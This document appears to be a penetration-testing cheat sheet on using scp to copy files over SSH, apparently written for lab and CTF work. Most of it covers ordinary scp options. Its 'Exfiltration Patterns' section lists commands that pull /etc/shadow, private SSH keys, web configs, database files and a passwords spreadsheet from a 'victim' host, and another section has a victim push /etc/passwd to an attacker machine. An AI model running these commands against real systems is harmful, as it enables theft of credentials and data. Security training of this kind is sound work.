# SCP

**Tags:** `#scp` `#filetransfer` `#ssh` `#exfil` `#linux`

SSH-based file copy — transfers files between hosts over SSH. Requires valid SSH credentials or key. Bidirectional: push files to remote or pull files from remote. Standard tool for Linux-to-Linux transfers when SSH is available.

**Source:** Pre-installed on Kali (`openssh-client`)

```bash
# Download from remote to local
scp user@192.168.1.10:/path/to/file.txt ./file.txt

# Upload from local to remote
scp ./file.txt user@192.168.1.10:/tmp/file.txt
```

---

## Download (Pull from Remote)

```bash
# Single file
scp user@192.168.1.10:/etc/passwd ./passwd

# Specify SSH port
scp -P 2222 user@192.168.1.10:/home/user/file.txt ./

# Using identity file (private key)
scp -i ~/.ssh/id_rsa user@192.168.1.10:/root/flag.txt ./

# Recursive — copy entire directory
scp -r user@192.168.1.10:/home/user/documents ./documents

# Multiple files
scp user@192.168.1.10:"/tmp/file1.txt /tmp/file2.txt" ./

# Glob (must be quoted to prevent local expansion)
scp "user@192.168.1.10:/var/log/*.log" ./logs/
```

---

## Upload (Push to Remote)

```bash
# Single file
scp ./tool.exe user@192.168.1.10:/tmp/tool.exe

# Multiple files
scp tool.exe shell.py user@192.168.1.10:/tmp/

# Recursive directory
scp -r ./exploit_dir user@192.168.1.10:/tmp/

# Custom port
scp -P 2222 ./tool user@192.168.1.10:/tmp/

# Using identity file
scp -i ./victim_key ./payload user@192.168.1.10:/tmp/
```

---

## Useful Options

| Flag | Description |
|---|---|
| `-P <port>` | SSH port (capital P) |
| `-i <key>` | Identity/private key file |
| `-r` | Recursive (directories) |
| `-C` | Enable compression |
| `-q` | Quiet mode (suppress progress) |
| `-o StrictHostKeyChecking=no` | Skip host key verification |
| `-l <limit>` | Bandwidth limit in Kbps |

```bash
# Suppress host key prompts (common in lab/CTF)
scp -o StrictHostKeyChecking=no user@192.168.1.10:/tmp/file ./

# Compressed transfer (useful for large text files)
scp -C user@192.168.1.10:/var/log/large.log ./

# Limit bandwidth (OPSEC — avoid saturating link)
scp -l 1000 user@192.168.1.10:/data/dump.zip ./
```

---

## Exfiltration Patterns

```bash
# Exfil sensitive files
scp user@victim:/etc/shadow ./shadow
scp user@victim:/home/user/.ssh/id_rsa ./victim_key
scp user@victim:/var/www/html/config.php ./config.php
scp -r user@victim:/var/www/html ./webroot

# Exfil database
scp user@victim:/var/lib/mysql/app/*.ibd ./db_files/

# From Windows (via WinSCP or OpenSSH — Windows 10+)
scp user@victim:C:/Users/Administrator/Documents/passwords.xlsx ./
```

---

## Receiving Files (Kali as SCP Target)

To receive files pushed from a victim, SSH must be running on Kali:

```bash
# Ensure SSH is running on Kali
sudo systemctl start ssh

# Victim pushes file to Kali
scp /etc/passwd kali@KALI-IP:/tmp/passwd

# Or set up temporary SSH server on non-standard port
sudo sshd -p 2222 -f /etc/ssh/sshd_config
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
